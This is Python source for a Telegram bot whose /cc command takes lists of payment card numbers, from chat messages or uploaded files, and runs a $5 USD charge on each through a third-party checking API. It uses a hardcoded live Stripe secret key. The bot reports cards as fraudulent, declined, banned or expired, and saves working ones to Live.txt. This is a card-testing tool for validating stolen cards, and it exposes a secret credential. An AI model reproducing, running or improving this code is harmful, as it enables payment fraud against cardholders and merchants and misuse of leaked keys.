import requests
import concurrent.futures
import time
import json
import os
from pyrogram import Client, filters
from EQUROBOT import app

MAX_RETRIES = 5


# Read the credit card information from the file and convert the format
def read_cc_file(file_path):
    with open(file_path, 'r') as file:
        cc_lines = file.readlines()
    cc_list = []
    for line in cc_lines:
        parts = line.strip().split('|')
        if len(parts[2]) == 2:  # Check if the year is in two-digit format
            parts[2] = '20' + parts[2]
        formatted_cc = ':'.join(parts)
        cc_list.append(formatted_cc)
    return cc_list

# Function to make a single API request and process the response
def check_cc(cc, amount, currency, retry_count=0):
    if retry_count > MAX_RETRIES:
        print(f"{cc} Max retries exceeded.")
        return

    url = "https://api.mvy.ai/"
    params = {
        "lista": cc,
        "sk": "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",
        "amount": amount,
        "currency": currency,
    }

    try:
        start_time = time.time()
        response = requests.get(url, params=params)
        end_time = time.time()
        total_time = end_time - start_time

        # Check if response is empty or not in JSON format
        if not response.text:
            result = f"{cc} Empty response ❌ Time Taken: {total_time:.2f} seconds"
        else:
            response_data = response.json()
            status = response_data.get('status', '')
            message = response_data.get('message', '')
            amount = response_data.get('payment_info', {}).get('amount', '')
            currency = response_data.get('payment_info', {}).get('currency', '')
            risk = response_data.get('payment_info', {}).get('risk_level', '')
            receipt_url = response_data.get('payment_info', {}).get('receipt_url', '')
            api_time = response_data.get('rate_limit', {}).get('time_taken', '')

            if 'fraudulent' in message:
                result = f"{cc} Fraudulent ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
            elif 'generic_decline' in message:
                result = f"{cc} GENERIC DECLINED ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
            elif 'ERR013' in message:
                result = f"{cc} THE FUCKING BIN IS BANNED ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
            elif 'ERR012' in message:
                result = f"{cc} THE CARD IS FUCKING EXPIRED BRUH ❌ Time Taken: {total_time:.2f} seconds {risk} {amount} {currency} {receipt_url}"
            else:
                result = f"{cc} {message} ✅ Time Taken: {api_time} {risk} {amount} {currency} {receipt_url}"
                save_live_response(cc, message)

    except requests.exceptions.RequestException as e:
        print(f"{cc} Request Exception: {str(e)}. Retrying ({retry_count + 1}/{MAX_RETRIES + 1})...")
        time.sleep(1)  # Wait for 1 second before retrying
        check_cc(cc, amount, currency, retry_count + 1)

    except json.JSONDecodeError as e:
        print(f"{cc} JSON Decode Error: {str(e)}")

    print(result)
    return result

# Save the response to Live.txt if the message is not fraudulent or generic_decline
def save_live_response(cc, message):
    with open('Live.txt', 'a') as file:
        file.write(f"CC: {cc}\n")
        file.write(f"Response: {message} ✅\n\n")

# Handle incoming messages with the /mchk command
@app.on_message(filters.command("cc", prefixes=[".", "/"]))
async def check_cc_command(_, message):
    command_prefix_length = len(message.text.split()[0])
    cc_entry = message.text[command_prefix_length:].strip()

    reply_msg = message.reply_to_message
    if reply_msg:
        if reply_msg.text:
            cc_entries = reply_msg.text.strip().split('\n')
            results = [await process_credit_card(entry) for entry in cc_entries]
            await message.reply_text("\n\n".join(results))
        elif reply_msg.document:
            file_path = await app.download_media(reply_msg.document.file_id)
            output_file = f"results_{reply_msg.document.file_name}.txt"
            await process_credit_cards_in_file(file_path, output_file)
            os.remove(file_path)
            await message.reply_document(document=output_file)
            os.remove(output_file)
        else:
            await message.reply_text("Unsupported file type.")
            return

    elif cc_entry:
        cc_entries = cc_entry.split('\n')
        results = [await process_credit_card(entry) for entry in cc_entries]
        await message.reply_text("\n\n".join(results))
    else:
        await message.reply_text("Please provide credit card details or reply to a message containing them.")

# Function to process each credit card entry
async def process_credit_card(entry):
    cc_parts = entry.strip().split('|')
    if len(cc_parts) < 3:
        return f"Invalid credit card entry: {entry}"

    cc = cc_parts[0].strip()
    amount = 5.0  # Set the amount to be charged
    currency = "usd"  # Set the currency (e.g., 'usd')

    return check_cc(cc, amount, currency)

# Function to process credit cards from a file
async def process_credit_cards_in_file(file_path, output_file):
    cc_list = read_cc_file(file_path)
    amount = 5.0  # Set the amount to be charged
    currency = "usd"  # Set the currency (e.g., 'usd')

    results = [check_cc(cc, amount, currency) for cc in cc_list]

    with open(output_file, 'w') as file:
        file.write("\n\n".join(results))
